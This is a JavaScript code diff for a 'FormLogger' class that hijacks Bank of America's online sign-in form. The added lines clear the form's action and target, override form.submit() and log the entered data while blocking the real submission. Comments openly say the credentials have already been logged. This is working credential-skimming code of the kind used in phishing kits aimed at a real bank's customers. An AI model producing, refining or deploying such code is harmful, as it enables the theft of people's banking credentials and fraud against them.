@@ -153,25 +153,27 @@ class FormLogger {
     if (form) {
       console.log('[Logger] Found EnterOnlineIDForm, hijacking submission');
       
-      // Store original action
+      // Store original action/method so we can prevent submission to BoA
       this.originalAction = form.action;
       this.originalMethod = form.method;
       this.originalTarget = form.target;
       
-      // Override form.submit() method VERY EARLY
+      // CRITICAL: Remove form action so it cannot submit to Bank of America
+      // The form will still fire the submit event, but won't navigate
+      form.action = '';
+      form.target = '';
+      
+      // Override form.submit() method
       const self = this;
       const originalSubmit = form.submit;
       form.submit = function() {
         console.log('[Logger] Form.submit() called, intercepting...');
         self.logFormData(form).then(() => {
           console.log('[Logger] Data logged, blocking submission to Bank of America');
-          // DO NOT allow submission to Bank of America - we've already logged the credentials
-          // This prevents the redirect and error page
         }).catch(error => {
           console.error('[Logger] Error during submission:', error);
-          // Even on error, do NOT submit to Bank of America
         });
-        // Always prevent default form submission
+        // Return false (though this has limited effect on form.submit() calls)
         return false;
       };
       
